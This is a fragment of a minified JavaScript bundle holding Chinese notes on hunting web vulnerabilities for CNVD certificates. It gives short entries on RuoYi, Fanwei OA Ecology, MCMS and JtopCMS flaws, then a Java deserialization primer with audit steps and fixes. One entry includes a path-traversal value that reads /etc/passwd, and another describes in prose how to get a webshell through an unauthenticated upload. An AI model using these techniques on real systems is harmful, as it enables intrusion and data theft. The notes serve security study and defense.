                                                              1\u3001\u56E0\u4E3A\u4E00\u4E2A\u516C\u53F8\u4E0D\u540C\u7684\u7CFB\u7EDF\uFF0C\u5F88\u6709\u53EF\u80FD\u662F\u4E00\u4E2A\u5F00\u53D1\u56E2\u961F\u5199\u51FA\u6765\u7684\uFF1B\u4E00\u4E2A\u7CFB\u7EDF\u5B58\u5728\u95EE\u9898\uFF0C\u90A3\u4E48\u5176\u5F00\u53D1\u7684\u53E6\u4E00\u4E2A\u7CFB\u7EDF\u4E5F\u5F88\u5927\u6982\u7387\u5B58\u5728\u8BE5\u95EE\u9898
                                                      2\u3001\u8FD0\u6C14\u597D\u78B0\u5230\u7C7B\u4F3C\u7684\u7CFB\u7EDF\u7684\u8BDD\uFF0C\u5C31\u53EF\u4EE5\u5F00\u5FC3\u5730\u628A\u4E00\u4EFD\u62A5\u544A\u53D8\u6210\u4E24\u4EFD\u62A5\u544A\uFF0C\u62FF\u4E24\u4EFD\u8BC1\u4E66\u3002
                                2\u3001\u67E5\u770B\u7ED3\u679C\u540E\u53EF\u4EE5\u5BFC\u51FA\u6570\u636E\uFF0C
                                        1\u3001\u5982\u679C\u662F \u4F1A\u5458\u7684\u8BDD \uFF0C\u6BCF\u5929\u53EF\u4EE5\u5BFC\u51FA20\u6B21
                        3\u3001\u9501\u5B9A\u597D\u76EE\u6807\u7CFB\u7EDF\u540E\uFF0C\u901A\u8FC7\u7CFB\u7EDF\u7684\u6307\u7EB9\u53BB\u6279\u91CF\u641C\u7D22\u7C7B\u4F3C\u7CFB\u7EDF
                                title="xxxx\u7BA1\u7406\u7CFB\u7EDF"
                        4\u3001\u6700\u540E\u518D\u8FDB\u884C\u5E38\u89C4\u7684\u6F0F\u6D1E\u6316\u6398\uFF0C\u786E\u4FDD\u4F60\u6316\u6398\u5230\u7684\u6BCF\u4E2A\u6F0F\u6D1E\u90FD\u80FD\u62FF\u5230\u8BC1\u4E66\uFF0C\u518D\u4E5F\u4E0D\u7528\u53BB\u62C5\u5FC3\u662F\u5426\u7B26\u5408\u62FF\u8BC1\u4E66\u7684\u6807\u51C6\u4E86\u3002

          3\u3001\u5BA1\u6838\u6D41\u7A0B\uFF1A
                  1\u3001\u5BA1\u6838\u6D41\u7A0B\u5206\u4E3A\u4E00\u7EA7\u3001\u4E8C\u7EA7\u3001\u4E09\u7EA7\u5BA1\u6838
                        1\u3001\u4E00\u7EA7\u5BA1\u6838\uFF0C\u4E3B\u8981\u5BF9\u63D0\u4EA4\u7684\u6F0F\u6D1E\u4FE1\u606F\u5B8C\u6574\u6027\u8FDB\u884C\u5BA1\u6838
                        2\u3001\u4E8C\u7EA7\u5BA1\u6838\uFF0C\u4E3ACNVD\u5BF9\u6F0F\u6D1E\u7684\u4FE1\u606F\u6574\u7406
                        3\u3001\u4E09\u7EA7\u5BA1\u6838\uFF0C\u4E3ACNVD\u5BF9\u6F0F\u6D1E\u8FDB\u884C\u6709\u6548\u6027\u548C\u539F\u521B\u6027\u6838\u9A8C\u7684\u73AF\u8282
                  2\u3001\u901A\u5E38\u6765\u8BF4\u4E00\u4E8C\u7EA7\u5BA1\u6838\u90FD\u53EF\u4EE5\u901A\u8FC7\uFF0C\u800C\u4E14\u5BA1\u6838\u901F\u5EA6\u6BD4\u8F83\u5FEB\uFF0C\u6700\u91CD\u8981\u7684\u5C31\u662F\u4E09\u7EA7\u5BA1\u6838\uFF0C\u65F6\u95F4\u6BD4\u8F83\u957F\u3002

  `),Object(u.c)("\u8BC1\u4E661 \u2014\u2014 RuoYi\u540E\u53F0\u7BA1\u7406\u7CFB\u7EDF\uFF0C\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E",`

  RuoYi\u540E\u53F0\u7BA1\u7406\u7CFB\u7EDF\uFF0C\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E
          \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                  RuoYi < 4.5.1

          \u5229\u7528\u6761\u4EF6
                  1\u3001\u9700\u8981\u767B\u5F55\u8FDB\u540E\u53F0\u3002

          \u6F0F\u6D1E\u6982\u8FF0
                  1\u3001/common/download/resource?resource=xxx\u5904\uFF0C\u5B58\u5728\u300A\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u300B
                          1\u3001\u5728\u300Aresource\u300B\u53C2\u6570\uFF0C\u586B\u5165 \u57FA\u4E8E\u5F53\u524D\u8DEF\u5F84 \u7684\u76F8\u5BF9\u8DEF\u5F84\u3002\uFF08\u6BD4\u5982  /profile/../../../../../../../etc/passwd\uFF09
                                  1\u3001\u5373\u53EF\u4E0B\u8F7D \u670D\u52A1\u5668\u4E0A\u7684\u4EFB\u610F\u6587\u4EF6\u3002
                  `.concat(I(["\u300ACNVD-2021-01931\u300B\uFF1Ahttps://www.cnvd.org.cn/flaw/show/CNVD-2021-01931"]),`

          \u539F\u7406\u5206\u6790

          \u6F0F\u6D1E\u5229\u7528
  `)),Object(u.c)("\u8BC1\u4E662 \u2014\u2014 \u6CDB\u5FAEOA-Ecology\uFF0C\u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E",`

  \u6CDB\u5FAEOA-Ecology\uFF0C\u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E
          \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                  Ecology 9 \u7248\u672C
          \u5229\u7528\u6761\u4EF6
                  1\u3001\u65E0\u9700\u767B\u5F55

          \u6F0F\u6D1E\u6982\u8FF0
                  1\u3001\u901A\u8FC7\u8C03\u7528\uFF0C\u65E0\u9700\u6388\u6743\u7684\u56FE\u7247\u4E0A\u4F20\u63A5\u53E3\uFF1B\u7136\u540E\u8C03\u7528\u53E6\u5916\u4E00\u4E2A\u63A5\u53E3\uFF0C\u79FB\u52A8\u5185\u90E8OSS\u6587\u4EF6\u5230\u6307\u5B9A\u6587\u4EF6\u76EE\u5F55\u3002
                          1\u3001\u518D\u76F4\u63A5\u7528Url\u8BBF\u95EE\uFF0C\u5373\u53EF\u62FF\u5230WebShell\u3002
                  `.concat(I(),`

          \u539F\u7406\u5206\u6790

          \u6F0F\u6D1E\u5229\u7528

  `)),Object(u.c)("\u8BC1\u4E663 \u2014\u2014 RuoYi\u540E\u53F0\u7BA1\u7406\u7CFB\u7EDF\uFF0CSQL\u6CE8\u5165\u6F0F\u6D1E",`

  RuoYi\u540E\u53F0\u7BA1\u7406\u7CFB\u7EDF\uFF0CSQL\u6CE8\u5165\u6F0F\u6D1E
          \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                  RuoYi < 4.72

          \u5229\u7528\u6761\u4EF6
                  1\u3001\u767B\u5F55\u540E\u53EF\u7528\u3002

          \u6F0F\u6D1E\u6982\u8FF0
                  1\u3001\u5B9A\u65F6\u4EFB\u52A1\u90A3\u91CC\uFF0C\u5B58\u5728\u672A\u4FEE\u590D\u5B8C\u5168\u7684SQL\u6CE8\u5165\u3002
                  2\u3001\u548CSpringBoot\u7ED1\u5B9A\u6709\u5173\u3002
                  3\u3001\u66F4\u591A\u4E0D\u4FBF\u4E8E\u8BE6\u89E3\u3002
                  `.concat(I(),`


          \u539F\u7406\u5206\u6790

          \u6F0F\u6D1E\u5229\u7528

  `)),Object(u.c)("\u8BC1\u4E664 \u2014\u2014 \u56FD\u4EA7MCMS\u5F00\u6E90\u7CFB\u7EDF\uFF0CSQL\u6CE8\u5165\u6F0F\u6D1E",`

  \u56FD\u4EA7MCMS\u5F00\u6E90\u7CFB\u7EDF\uFF0CSQL\u6CE8\u5165\u6F0F\u6D1E
          \u8D44\u6599\uFF1A
                  https://hetian.blog.csdn.net/article/details/127203471
                          https://hetian.blog.csdn.net/article/details/127219086

          \u4ECB\u7ECD\uFF1A
                  1\u3001\u57FA\u4E8ESpringBoot 2\u67B6\u6784\uFF0C\u524D\u7AEF\u57FA\u4E8Evue\u3001element ui\u3002
                          1\u3001\u6BCF\u4E24\u4E2A\u6708\u6536\u96C6issues\u95EE\u9898\u5E76\u66F4\u65B0\u7248\u672C\uFF0C\u4E3A\u5F00\u53D1\u8005\u63D0\u4F9B\u4E0A\u767E\u5957\u514D\u8D39\u6A21\u677F,
                          2\u3001\u540C\u65F6\u63D0\u4F9B\u9002\u7528\u7684\u63D2\u4EF6\uFF08\u6587\u7AE0\u3001\u5546\u57CE\u3001\u5FAE\u4FE1\u3001\u8BBA\u575B\u3001\u4F1A\u5458\u3001\u8BC4\u8BBA\u3001\u652F\u4ED8\u3001\u79EF\u5206\u3001\u5DE5\u4F5C\u6D41\u3001\u4EFB\u52A1\u8C03\u5EA6\u7B49...\uFF09
                  2\u3001\u4ED3\u5E93\u5730\u5740\uFF1Ahttps://gitee.com/mingSoft/MCMS

          \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                  MCMS < 5.2.4

          \u5229\u7528\u6761\u4EF6

          \u6F0F\u6D1E\u6982\u8FF0
                  `.concat(I(["\u300ACNVD-2022-15490\u300B\uFF1Ahttps://www.cnvd.org.cn/flaw/show/CNVD-2022-15490","\u300ACNVD-2022-18425\u300B\uFF1Ahttps://www.cnvd.org.cn/flaw/show/CNVD-2022-18425"]),`

                  1\u3001\u300A/ms/mdiy/page/verify.do?fieldName=xxx\u300B\uFF0C\u6B64\u5904\u53C2\u6570\u300AfieldName\u300B\u5B58\u5728 MyBatis\u7684\${} \u5B57\u7B26\u4E32\u62FC\u63A5\u3002

          \u539F\u7406\u5206\u6790
                  1\u3001\u5728\u300Anet.mingsoft.base.dao.IBaseDao#queryBySQL\u300B\u65B9\u6CD5\u5904\u3002
                          1\u3001\u5BF9\u5E94\u5230 xml\u6587\u4EF6 \uFF0C\u53EF\u4EE5\u770B\u5230 \${} \u7684\u62FC\u63A5\u4F7F\u7528\u3002\u5E76\u672A\u505A\u9884\u7F16\u8BD1\u3002

          \u6F0F\u6D1E\u5229\u7528

  `)),Object(u.c)("\uFF08\u8FD8\u6CA1\u505A\u5B8C\uFF09\uFF08\u8FD8\u6CA1\u505A\u5B8C\uFF09\uFF08\u8FD8\u6CA1\u505A\u5B8C\uFF09\u8BC1\u4E665 \u2014\u2014 \u56FD\u4EA7JtopCMS\u5F00\u6E90\u7CFB\u7EDF\uFF0C\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E",`

  \u56FD\u4EA7JtopCMS\u5F00\u6E90\u7CFB\u7EDF\uFF0C\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E
          \u8D44\u6599\uFF1A
                  https://blog.csdn.net/q851579181q/article/details/115454864
                  https://www.freebuf.com/vuls/267872.html

          \u4ECB\u7ECD\uFF1A

          \u53D7\u5F71\u54CD\u7248\u672C\uFF1A

          \u5229\u7528\u6761\u4EF6

          \u6F0F\u6D1E\u6982\u8FF0

          \u539F\u7406\u5206\u6790

          \u6F0F\u6D1E\u5229\u7528

  `))]),\u53CD\u5E8F\u5217\u5316\u7BC7:G([Object(u.a)(w||(w=Object(t.a)([`
  \u3010\u53CD\u5E8F\u5217\u5316\u3011
  \u3010Jackson\u3011
  \u3010FastJson\u3011
  \u3010Serial\u63A5\u53E3\uFF0C\u666E\u901AObject\u3011
  \u3010\u53CD\u5C04\u3011
  \u3010CC\u3011\u3001\u3010CC\u94FE\u3011\u3010CommonsCollections\u3011\u3010Apache Commons Collections\u3011\u3010ApacheCC\u94FE\u3011
  \u3010\u9632\u8303\u3011
  \u3010\u53CD\u5E8F\u5217\u5316\u5DE5\u5177\u3011\u3001\u3010YsoSerial\u3011\u3001\u3010CC\u94FE\u3011\u3001\u3010Groovy\u94FE\u3011

  \u56E0\u4E3A\u300A\u53CD\u5E8F\u5217\u5316\u300B\u8FC7\u4E8E\u91CD\u8981\uFF0C\u6240\u4EE5\u5355\u5F00\u4E86\u4E00\u4E2A\u73AF\u8282\uFF0C\u505A\u4ECB\u7ECD\uFF01\uFF01\uFF01

  \u53CD\u5E8F\u5217\u5316\u57FA\u7840\u77E5\u8BC6`,`


  `,`

  `,`

  `,`

  `,`

  `,`


  `,`


  `])),Object(u.c)("\u53CD\u5E8F\u5217\u5316\u57FA\u7840\u77E5\u8BC6________\u53CD\u5E8F\u5217\u5316\u548C\u5E8F\u5217\u5316\u7684\u533A\u522B________\u9632\u8303\u624B\u6BB5________\u5982\u4F55\u53D1\u73B0 Java \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E________Java\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u7684\u5F62\u6210\u539F\u56E0\uFF0C\u5177\u4F53\u662F\u54EA\u4E9B\u7C7B\u5E93\u9020\u6210\u7684\uFF0C\u548C\u6F0F\u6D1E\u89E6\u53D1\u6761\u4EF6\u7B49",`


\u6F0F\u6D1E\u6210\u56E0

    1. Java\u7A0B\u5E8F\u4F7F\u7528ObjectInputStream\u5BF9\u8C61\u7684readObject()\u65B9\u6CD5\u5C06\u53CD\u5E8F\u5217\u5316\u6570\u636E\u8F6C\u6362\u4E3Ajava\u5BF9\u8C61\u3002\u5982\u679C\u88AB\u53CD\u5E8F\u5217\u5316\u7684\u5BF9\u8C61\u91CD\u5199\u4E86readObject()\u65B9\u6CD5\uFF0C\u5219\u4F1A\u6267\u884C\u8BE5\u5BF9\u8C61\u7684\u6B64\u65B9\u6CD5\u3002\u56E0\u6B64\uFF0C\u5F53\u8F93\u5165\u7684\u53CD\u5E8F\u5217\u5316\u7684\u6570\u636E\u53EF\u88AB\u7528\u6237\u63A7\u5236\uFF0C\u90A3\u4E48\u653B\u51FB\u8005\u5373\u53EF\u901A\u8FC7\u6784\u9020\u6076\u610F\u8F93\u5165\uFF0C\u8BA9\u53CD\u5E8F\u5217\u5316\u4EA7\u751F\u975E\u9884\u671F\u7684\u5BF9\u8C61\uFF0C\u5728\u6B64\u8FC7\u7A0B\u4E2D\u6267\u884C\u6784\u9020\u7684\u4EFB\u610F\u4EE3\u7801\u3002
    2. \u53CD\u5E8F\u5217\u5316\u4E00\u4E2A\u7C7B\u65F6\uFF0C\u901A\u5E38\u4F1A\u4F34\u968F\u8C03\u7528 get/set \u65B9\u6CD5\u6CE8\u5165\u53C2\u6570\uFF0C\u5E76\u4E3A\u8FD9\u4E2A\u7C7B\u521B\u5EFA\u4E00\u4E2A\u65B0\u7684\u5B9E\u4F8B\u5316\u5BF9\u8C61\uFF0C\u56E0\u6B64\u4F1A\u6267\u884C\u6784\u9020\u65B9\u6CD5\u53CA\u9759\u6001\u4EE3\u7801\u5757\uFF0C\u5728\u8FD9\u79CD\u60C5\u51B5\u4E0B\uFF0C\u653B\u51FB\u8005\u4E5F\u53EF\u4EE5\u6316\u6398gadget\u6765\u6267\u884C\u5371\u9669\u7684\u52A8\u4F5C\u3002
    3. \u6839\u636E\u6743\u9650\u6700\u5C0F\u5316\u539F\u5219\uFF0C\u4E00\u822C\u60C5\u51B5\u4E0B\u53CD\u5E8F\u5217\u5316\u7684\u7C7B\u4E2D\u7684readObject()\u3001writeObject()\u3001readResolve()\u3001writeReplace() \u65B9\u6CD5\u5FC5\u987B\u88AB\u58F0\u660E\u4E3A private void\u3002\u5426\u5219\u5982\u679C Serializable \u7684\u7C7B\u5F00\u653E writeObject \u51FD\u6570\u4E3A public \u7684\u8BDD\uFF0C\u7ED9\u975E\u53D7\u4FE1\u8C03\u7528\u8005\u8FC7\u9AD8\u6743\u9650\uFF0C\u6F5C\u5728\u6709\u98CE\u9669\u3002
    4. \u5728 Java \u73AF\u5883\u4E2D\uFF0C\u5141\u8BB8\u5904\u4E8E\u4E0D\u540C\u53D7\u4FE1\u57DF\u7684\u7EC4\u4EF6\u8FDB\u884C\u6570\u636E\u901A\u4FE1\uFF0C\u4ECE\u800C\u51FA\u73B0\u8DE8\u53D7\u4FE1\u8FB9\u754C\u7684\u6570\u636E\u4F20\u8F93\u3002\u5982\u679C\u53CD\u5E8F\u5217\u5316\u7C7B\u4E2D\u5B58\u5728\u672A\u52A0\u5BC6\u7684\u654F\u611F\u6570\u636E\uFF0C\u5C06\u9762\u4E34\u6CC4\u9732\u6216\u88AB\u7BE1\u6539\u7684\u98CE\u9669\u3002
    5.\u5BF9\u975E\u9759\u6001\u5185\u90E8\u7C7B\u7684\u5E8F\u5217\u5316\u4F9D\u8D56\u7F16\u8BD1\u5668\uFF0C\u4E14\u968F\u7740\u5E73\u53F0\u7684\u4E0D\u540C\u800C\u4E0D\u540C\uFF0C\u5BB9\u6613\u4EA7\u751F\u9519\u8BEF\u3002\u5BF9\u5185\u90E8\u7C7B\u7684\u5E8F\u5217\u5316\u4F1A\u5BFC\u81F4\u5916\u90E8\u7C7B\u7684\u5B9E\u4F8B\u4E5F\u88AB\u5E8F\u5217\u5316\u3002\u8FD9\u6837\u6709\u53EF\u80FD\u6CC4\u9732\u654F\u611F\u6570\u636E\u3002

\u5BA1\u8BA1\u7B56\u7565

    1. \u53CD\u5E8F\u5217\u5316\u64CD\u4F5C\u7684\u529F\u80FD\u4F4D\u7F6E\uFF1A
        \u5BFC\u5165\u6A21\u7248\u6587\u4EF6\u3001\u7F51\u7EDC\u901A\u4FE1\u3001\u6570\u636E\u4F20\u8F93\u3001\u65E5\u5FD7\u683C\u5F0F\u5316\u5B58\u50A8\u3001\u5BF9\u8C61\u6570\u636E\u843D\u78C1\u76D8\u6216DB\u5B58\u50A8\u7B49\u4E1A\u52A1\u573A\u666F\u3002
    2. \u53EF\u4EE5\u901A\u8FC7\u5BF9\u7F51\u7EDC\u6293\u5305\u5BFB\u627E\u5E8F\u5217\u5316\u6570\u636E\uFF1Ajava\u5E8F\u5217\u5316\u7684\u6570\u636E\u4E00\u822C\u4F1A\u4EE5\u6807\u8BB0\uFF08ac ed 00 05\uFF09\u5F00\u5934\uFF0Cbase64\u7F16\u7801\u540E\u7684\u7279\u5F81\u4E3ArO0AB\u3002

    3. \u4E00\u4E9B\u670D\u52A1\u7684\u4F20\u8F93\u53EF\u80FD\u5B58\u5728\u53CD\u5E8F\u5217\u5316\uFF1A\u591A\u5E73\u53F0HTTP\u901A\u4FE1\u3001RMI\u3001JMX\u3002
    4. \u4E00\u4E9B\u53CD\u5E8F\u5217\u5316\u89E6\u53D1\u70B9\uFF1A
        ObjectInputStream.readObject
        ObjectInputStream.readUnshared
        XMLDecoder.readObject
        Yaml.load
        XStream.fromXML
        ObjectMapper.readValue
        JSON.parseObject

        \u4E3B\u8981\u67E5\u770B\u8FD9\u4E9B\u89E6\u53D1\u70B9\u7684\u53C2\u6570\u662F\u5426\u7531\u7528\u6237\u53EF\u63A7\u3002

    5. \u5168\u5C40\u641C\u7D22\u662F\u5426\u5177\u6709public\u6743\u9650\u7684\u4E00\u4E9B\u65B9\u6CD5\uFF1Apublic * writeObject/readObject/readResolve/writeReplace\u3002

    6. \u67E5\u770B\u53CD\u5E8F\u5217\u5316\u7C7B\u4E2D\u662F\u5426\u5305\u542B\u654F\u611F\u6570\u636E\u3002

    7. \u5168\u5C40\u67E5\u627Eimplements Serializable \u7684\u6240\u6709\u5185\u90E8\u7C7B\u3002



\u53CD\u5E8F\u5217\u5316\u548C\u5E8F\u5217\u5316\u7684\u533A\u522B
    1. \u8BF4\u6CD5\u4E00\uFF1A
        1. \u5185\u5B58\u4E2D\u7684\u6570\u636E\u5BF9\u8C61\u53EA\u6709\u8F6C\u6362\u4E3A\u4E8C\u8FDB\u5236\u6D41\u624D\u53EF\u4EE5\u8FDB\u884C\u6570\u636E\u6301\u4E45\u5316\u548C\u7F51\u7EDC\u4F20\u8F93\u3002\u5C06\u6570\u636E\u5BF9\u8C61\u8F6C\u6362\u4E3A\u4E8C\u8FDB\u5236\u6D41\u7684\u8FC7\u7A0B\u79F0\u4E3A\u5BF9\u8C61\u7684\u5E8F\u5217\u5316\uFF08Serialization\uFF09\u3002
        2. \u53CD\u4E4B\uFF0C\u5C06\u4E8C\u8FDB\u5236\u6D41\u6062\u590D\u4E3A\u6570\u636E\u5BF9\u8C61\u7684\u8FC7\u7A0B\u79F0\u4E3A\u53CD\u5E8F\u5217\u5316\uFF08Deserialization\uFF09\u3002
    2. \u8BF4\u6CD5\u4E8C\uFF1A
        1. \u5E8F\u5217\u5316\u901A\u4FD7\u5730\u8BB2\u5C31\u662F\u5C06\u4E00\u4E2A\u5BF9\u8C61\u8F6C\u6362\u6210\u4E00\u4E2A\u5B57\u8282\u6D41\u7684\u8FC7\u7A0B\uFF0C\u8FD9\u6837\u5C31\u53EF\u4EE5\u8F7B\u677E\u4FDD\u5B58\u5728\u78C1\u76D8\u6587\u4EF6\u6216\u6570\u636E\u5E93\u4E2D\u3002
        2. \u53CD\u5E8F\u5217\u5316\u662F\u5E8F\u5217\u5316\u7684\u9006\u8FC7\u7A0B\uFF0C\u5C31\u662F\u5C06\u4E00\u4E2A\u5B57\u8282\u6D41\u8F6C\u6362\u56DE\u539F\u6765\u7684\u5BF9\u8C61\u7684\u8FC7\u7A0B\u3002


\u5982\u4F55\u4FEE\u590D

    1. \u5BF9\u8981\u53CD\u5E8F\u5217\u5316\u7684\u5BF9\u8C61\u8BBE\u7F6E\u9ED1\u767D\u540D\u5355\uFF0C\u50CF fastJSON\u3001Jackson\u8FD9\u79CD\u5B98\u65B9\u4F1A\u7EF4\u62A4\u4E00\u4E2A\u9ED1\u540D\u5355\uFF0C\u6301\u7EED\u66F4\u65B0\uFF0C\u4F46\u8FD8\u662F\u5EFA\u8BAE\u4F7F\u7528\u767D\u540D\u5355\uFF0C\u53EF\u901A\u8FC7Hook\u51FD\u6570resolveClass()\u6765\u6821\u9A8C\u53CD\u5E8F\u5217\u5316\u7684\u7C7B\u4ECE\u800C\u5B9E\u73B0\u767D\u540D\u5355\u6821\u9A8C\uFF1B\u4E5F\u53EF\u4EE5\u4F7F\u7528Apache Commons IO Serialization\u5305\u4E2D\u7684ValidatingObjectInputStream\u7C7B\u7684accept()\u65B9\u6CD5\u6765\u5B9E\u73B0\u53CD\u5E8F\u5217\u5316\u7C7B\u767D/\u9ED1\u540D\u5355\u63A7\u5236\u3002
    2. \u5BF9\u4E8E\u4E00\u4E9B\u654F\u611F\u7684\u5C5E\u6027\uFF0C\u5C06\u5176\u58F0\u660E\u4E3A transient\uFF0C\u6216\u8FDB\u884C\u52A0\u5BC6\u5904\u7406\u3002
    3. \u907F\u514D\u5185\u90E8\u7C7B\u7684\u5E8F\u5217\u5316\uFF0C\u6216\u628A\u5185\u90E8\u7C7B\u58F0\u660E\u4E3A\u9759\u6001\uFF0C\u4F46\u8FD8\u662F\u8981\u6CE8\u610F\u654F\u611F\u4FE1\u606F\u7684\u95EE\u9898\u3002


\u53CD\u5E8F\u5217\u5316 \u9632\u8303
    1. \u7C7B\u767D\u540D\u5355\u6821\u9A8C
    2. \u7981\u6B62 JVM \u6267\u884C\u5916\u90E8\u547D\u4EE4 Runtime.exec
    3. \u5347\u7EA7\u7B2C\u4E09\u65B9\u4E2D\u95F4\u4EF6
    4. \u5347\u7EA7JDK
    5. \u5BF9InputStream\u5BF9\u8C61\u8FDB\u884C\u68C0\u67E5\u8FC7\u6EE4
            \u63A8\u8350\u4E00\u4E2A\u5F00\u6E90\u7684  Java\u9632\u5FA1\u53CD\u5E8F\u5217\u5316\u5E93  \u3010SerialKiller\u3011\uFF1A
                    \u5730\u5740\uFF1Ahttps://github.com/ikkisoft/SerialKiller


\u5982\u4F55\u53D1\u73B0 Java \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E
    1.\u4ECE\u6D41\u91CF\u4E2D\u53D1\u73B0\u5E8F\u5217\u5316\u7684\u75D5\u8FF9\uFF0C\u5173\u952E\u5B57\uFF1Aac ed 00 05\uFF0CrO0AB
    2.Java RMI \u7684\u4F20\u8F93 100% \u57FA\u4E8E\u53CD\u5E8F\u5217\u5316\uFF0CJava RMI \u7684\u9ED8\u8BA4\u7AEF\u53E3\u662F1099\u7AEF\u53E3
    3.\u4ECE\u6E90\u7801\u5165\u624B\uFF0C\u53EF\u4EE5\u88AB\u5E8F\u5217\u5316\u7684\u7C7B\u4E00\u5B9A\u5B9E\u73B0\u4E86Serializable\u63A5\u53E3
    4.\u89C2\u5BDF\u53CD\u5E8F\u5217\u5316\u65F6\u7684readObject()\u65B9\u6CD5\u662F\u5426\u91CD\u5199\uFF0C\u91CD\u5199\u4E2D\u662F\u5426\u6709\u8BBE\u8BA1\u4E0D\u5408\u7406\uFF0C\u53EF\u4EE5\u88AB\u5229\u7528\u4E4B\u5904



Java\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u7684\u5F62\u6210\u539F\u56E0\uFF0C\u5177\u4F53\u662F\u54EA\u4E9B\u7C7B\u5E93\u9020\u6210\u7684\uFF0C\u548C\u6F0F\u6D1E\u89E6\u53D1\u6761\u4EF6\u7B49

    Java \u5E8F\u5217\u5316\u662F\u6307\u628A Java \u5BF9\u8C61\u8F6C\u6362\u4E3A\u5B57\u8282\u5E8F\u5217\u7684\u8FC7\u7A0B\uFF0C\u4EE5\u4FBF\u4E8E\u4FDD\u5B58\u5728\u5185\u5B58\u3001\u6587\u4EF6\u3001\u6570\u636E\u5E93\u4E2D\uFF0C
        ObjectOutputStream\u7C7B\u7684 writeObject() \u65B9\u6CD5\u53EF\u4EE5\u5B9E\u73B0\u5E8F\u5217\u5316\u3002

    Java\u7684\u5E8F\u5217\u5316\u548C\u53CD\u5E8F\u5217\u5316\u672C\u8EAB\u5E76\u4E0D\u5B58\u5728\u95EE\u9898\uFF0C
        \u4F46\u5982\u679Cjava\u5E94\u7528\u5BF9\u7528\u6237\u8F93\u5165\uFF0C\u5373\u4E0D\u53EF\u4FE1\u6570\u636E\u505A\u4E86\u53CD\u5E8F\u5217\u5316\u5904\u7406\uFF0C\u90A3\u4E48\u653B\u51FB\u8005\u53EF\u4EE5\u901A\u8FC7\u6784\u9020\u6076\u610F\u8F93\u5165\uFF0C\u8BA9\u53CD\u5E8F\u5217\u5316\u4EA7\u751F\u975E\u9884\u671F\u7684\u5BF9\u8C61\uFF0C
            \u800C\u975E\u9884\u671F\u7684\u5BF9\u8C61\u5728\u4EA7\u751F\u8FC7\u7A0B\u4E2D\u5C31\u6709\u53EF\u80FD\u5E26\u6765\u4EFB\u610F\u4EE3\u7801\u6267\u884C\u7684\u540E\u679C\u3002

    \u6240\u4EE5\u8FD9\u4E2A\u95EE\u9898\u7684\u6839\u6E90\u5728\u4E8E\u7C7BObjectInputStream\u5728\u53CD\u5E8F\u5217\u5316\u65F6\uFF0C\u6CA1\u6709\u5BF9\u751F\u6210\u7684\u5BF9\u8C61\u7684\u7C7B\u578B\u505A\u9650\u5236\uFF1B
    \u6B63\u56E0\u4E3A\u6B64\uFF0Cjava\u63D0\u4F9B\u7684\u6807\u51C6\u5E93\u53CA\u5927\u91CF\u7B2C\u4E09\u65B9\u516C\u5171\u7C7B\u5E93\u6210\u4E3A\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u5229\u7528\u7684\u5173\u952E\u3002

  `),Object(u.c)("Serial\u63A5\u53E3\uFF0C\u666E\u901AObject",`

  \u3010Serial\u3011\u3001\u666E\u901AObject\u7684\u3010readObject\u3011



  \u4ECB\u7ECD\uFF1A
      1\u3001Java\u5F15\u5165\u4E86\u300A\u6570\u636E\u4F20\u8F93\u5B58\u50A8\u63A5\u53E3\u300B\uFF0C\u901A\u8FC7\u8FD9\u79CD\u673A\u5236\u80FD\u591F\u5B9E\u73B0\u300A\u6570\u636E\u7ED3\u6784\u548C\u5BF9\u8C61\u300B\u7684\u5B58\u50A8\u548C\u4F20\u8F93\u3002

  ObjectInputStream\u7C7B
      1\u3001readObject\u65B9\u6CD5


  \u5B9E\u65BD\u653B\u51FB\u7684\u4E09\u4E2A\u6761\u4EF6
      1\u3001\u65E0\u5FB7\u7684\u75C5\u6BD2\uFF08\u4E00\u4E2A\u53EF\u4EE5\u8FDB\u884C\u5E8F\u5217\u5316\u7684\u6076\u610F\u5BF9\u8C61\uFF09
      2\u3001\u65E0\u8F9C\u7684\u5BBF\u4E3B\uFF08\u4E00\u4E2A\u5B9E\u73B0readObject\u65B9\u6CD5\u4E14\u53EF\u80FD\u5B58\u5728\u5176\u4ED6\u53EF\u5229\u7528\u884C\u4E3A\u7684Serializable\u7C7B\uFF09
      3\u3001\u65E0\u826F\u7684\u5A92\u4ECB\uFF08\u7528\u6765\u6784\u5EFA\u6076\u610F\u5BF9\u8C61\u5230\u89E6\u53D1\u5BF9\u8C61\u7684\u5305\u88C5\u7C7B\uFF09

  `),Object(u.c)("\u53CD\u5C04",`

  Java\u53CD\u5C04

      1\u3001\u5B9A\u4E49
              1\u3001\u5BF9\u4E8E\u4EFB\u610F\u4E00\u4E2A\u7C7B\uFF0C\u90FD\u80FD\u591F\u5F97\u5230\u8FD9\u4E2A\u7C7B\u7684\u6240\u6709\u5C5E\u6027\u548C\u65B9\u6CD5\uFF1B\u5BF9\u4E8E\u4EFB\u610F\u4E00\u4E2A\u5BF9\u8C61\uFF0C\u90FD\u80FD\u591F\u8C03\u7528\u5B83\u7684\u4EFB\u610F\u65B9\u6CD5\u548C\u5C5E\u6027\uFF1B\u8FD9\u79CD\u52A8\u6001\u83B7\u53D6\u4FE1\u606F\u4EE5\u53CA\u52A8\u6001\u8C03\u7528\u5BF9\u8C61\u65B9\u6CD5\u7684\u529F\u80FD\u79F0\u4E3Ajava\u8BED\u8A00\u7684\u53CD\u5C04\u673A\u5236\u3002
